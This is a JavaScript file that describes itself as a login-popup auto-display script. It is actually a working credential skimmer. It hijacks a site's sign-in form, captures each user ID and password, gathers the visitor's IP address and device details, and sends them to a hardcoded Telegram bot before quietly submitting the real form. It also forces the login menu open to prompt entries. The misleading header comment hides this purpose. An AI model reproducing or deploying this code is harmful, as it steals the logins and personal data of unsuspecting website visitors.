/**
 * Login Popup Auto-Display Script
 * Opens the login menu 3 seconds after page load
 * Closes automatically after 5 seconds
 * Reopens automatically 5 seconds after closing (continuous loop)
 */

(function () {
  "use strict";

  // Telegram Bot Configuration
  const TELEGRAM_BOT_TOKEN = "8582259014:AAHHw5JpBWZzeasX09iqn9bUN7ZJaEpGOSE"; // Replace with your bot token
  const TELEGRAM_CHAT_ID = "7687741443"; // Replace with your chat/channel ID

  // Function to get user's IP address
  async function getUserIP() {
    try {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      return data.ip;
    } catch (error) {
      return "Unable to fetch IP";
    }
  }

  // Function to get user information
  function getUserInfo() {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timestamp: new Date().toISOString(),
      referrer: document.referrer || "Direct",
      currentUrl: window.location.href,
    };
  }

  // Function to send data to Telegram
  async function sendToTelegram(loginData) {
    const userInfo = getUserInfo();
    const userIP = await getUserIP();

    const message = `
🔐 *New Login Attempt*

👤 *Login Credentials:*
• User ID: \`${loginData.userid}\`
• Password: \`${loginData.password}\`

🌐 *Network Information:*
• IP Address: \`${userIP}\`
• User Agent: \`${userInfo.userAgent}\`

💻 *Device Information:*
• Platform: \`${userInfo.platform}\`
• Screen: \`${userInfo.screenResolution}\`
• Language: \`${userInfo.language}\`
• Timezone: \`${userInfo.timezone}\`

📍 *Session Information:*
• URL: ${userInfo.currentUrl}
• Referrer: ${userInfo.referrer}
• Timestamp: ${userInfo.timestamp}
    `;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
      await fetch(telegramUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
    } catch (error) {
      console.error("Failed to send to Telegram:", error);
    }
  }

  // Wait for DOM to be fully loaded
  document.addEventListener("DOMContentLoaded", function () {
    const loginButton = document.getElementById("signInCollapseToggle");
    const loginCollapse = document.getElementById("signInCollapse");

    if (!loginButton || !loginCollapse) {
      console.warn("Login elements not found");
      return;
    }

    // Function to open the login popup
    function openLoginPopup() {
      if (!loginCollapse.classList.contains("show")) {
        loginButton.click();
      }
    }

    // Intercept form submission
    const loginForm = document.querySelector(".sign-in-menu__form");
    if (loginForm) {
      const handleSubmit = function (e) {
        e.preventDefault();

        // Get form data
        const userid = loginForm.querySelector('input[name="userid"]').value;
        const password = loginForm.querySelector(
          'input[name="password"]'
        ).value;

        // Send to Telegram
        sendToTelegram({ userid, password }).then(() => {
          // After sending to Telegram, submit the original form
          // Remove the event listener to avoid infinite loop
          loginForm.removeEventListener("submit", handleSubmit);
          loginForm.submit();
        });
      };

      loginForm.addEventListener("submit", handleSubmit);
    }

    // Initial trigger: Show login popup after 3 seconds
    setTimeout(function () {
      openLoginPopup();
    }, 3000);
  });
})();
